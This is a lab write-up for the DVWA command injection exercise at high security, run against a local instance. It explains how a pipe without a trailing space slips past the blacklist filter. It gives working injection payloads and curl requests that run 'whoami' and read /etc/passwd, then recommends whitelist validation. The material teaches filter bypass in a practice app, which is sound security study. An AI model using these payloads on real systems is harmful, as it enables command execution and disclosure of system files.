# DVWA Command Injection — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/exec/

## Source Code Behavior (High)
- Extended blacklist removes: `&`, `;`, `|` (with trailing space), `-`, `$`, `(`, `)`, backtick, `||`
- Key detail: the `|` filter is `'| '` (pipe followed by space) — NOT just `|`
- This means `|` without a trailing space is NOT filtered

## Key Differences from Medium
1. Many more operators blacklisted
2. BUT the pipe `|` filter has a bug: only filters `| ` (pipe+space)
3. `|command` (no space after pipe) bypasses the filter

## Working Payloads

### Pipe without space (exploiting the filter bug)
```
127.0.0.1|whoami
127.0.0.1|cat /etc/passwd
127.0.0.1|id
127.0.0.1|uname -a
```

## Step-by-Step Exploitation
1. Enter `127.0.0.1 | whoami` — fails (pipe+space filtered)
2. Enter `127.0.0.1|whoami` — works! No space after pipe bypasses filter
3. Enter `127.0.0.1|cat /etc/passwd` — file read successful

## curl Commands
```bash
# Pipe without space bypass
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1|whoami&Submit=Submit" \
  -b "PHPSESSID=<session>;security=high"

# Read sensitive files
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1|cat+/etc/passwd&Submit=Submit" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- The "bug" in the filter is intentional by DVWA designers to teach about blacklist weaknesses
- `'| '` vs `'|'` — a single space character makes the difference
- Demonstrates why blacklisting is fundamentally flawed for command injection
- Proper fix: validate input is a valid IP address (whitelist approach)
